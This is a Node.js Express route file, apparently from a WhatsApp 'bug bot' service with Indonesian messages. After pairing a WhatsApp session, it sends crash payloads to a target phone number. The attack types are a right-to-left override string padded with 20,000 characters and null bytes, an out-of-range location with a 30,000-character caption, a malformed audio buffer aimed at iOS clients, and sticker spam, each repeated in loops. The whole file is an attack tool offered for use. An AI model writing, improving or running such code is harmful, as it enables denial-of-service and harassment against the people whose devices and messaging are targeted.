const express = require('express');
const router = express.Router();
const pairingRouter = require('./pairing');

router.post('/send', async (req, res) => {
  try {
    if (!req.session.user) return res.status(401).json({ ok: false, msg: 'Login dulu.' });
    const userId = req.session.user.id;

    let { target, type } = req.body;
    if (!target || !type) return res.status(400).json({ ok: false, msg: 'Missing fields' });

    const sock = pairingRouter.getSock(userId);
    if (!sock) return res.status(400).json({ ok: false, msg: 'Anda belum pairing WhatsApp.' });

    let cleanTarget = target.replace(/[^0-9]/g, '');
    if (cleanTarget.startsWith('0')) cleanTarget = '62' + cleanTarget.slice(1);
    
    const [result] = await sock.onWhatsApp(cleanTarget);
    if (!result || !result.exists) return res.status(400).json({ ok: false, msg: 'Nomor target tidak terdaftar di WhatsApp.' });

    const jid = result.jid;
    let sent = 0;
    let loops = 3;

    if (type === 'foreclose') {
      const payload = '\u202E' + 'ｦ'.repeat(20000) + '\u0000'.repeat(10000) + '\u202E';
      for (let i = 0; i < loops; i++) {
        await sock.sendMessage(jid, { text: payload }).catch(() => {});
        sent++; await new Promise(r => setTimeout(r, 1000));
      }
    } 
    else if (type === 'crash') {
      for (let i = 0; i < loops; i++) {
        await sock.sendMessage(jid, { location: { degreesLatitude: 999999, degreesLongitude: 999999 }, caption: 'A'.repeat(30000) }).catch(() => {});
        sent++; await new Promise(r => setTimeout(r, 1500));
      }
    } 
    else if (type === 'crashios') {
      const fakeAudio = Buffer.from('UklGRiQAAABXQVZFZm10IBAAAAABAAEAESsAACJWAAACABAAZGF0YQAAAAA=', 'base64');
      for (let i = 0; i < loops; i++) {
        await sock.sendMessage(jid, { audio: fakeAudio, mimetype: 'audio/mp4', ptt: true }).catch(() => {});
        sent++; await new Promise(r => setTimeout(r, 1000));
      }
    }
    else if (type === 'delay') {
      const stickerBuffer = Buffer.from('UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEAAUAmJaQAA3AA/vuUAAA=', 'base64');
      loops = 10;
      for (let i = 0; i < loops; i++) {
        await sock.sendMessage(jid, { sticker: stickerBuffer }).catch(() => {});
        sent++; await new Promise(r => setTimeout(r, 500));
      }
    }

    res.json({ ok: true, msg: `Berhasil menembak ${cleanTarget}`, packetsSent: sent });
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

module.exports = router;
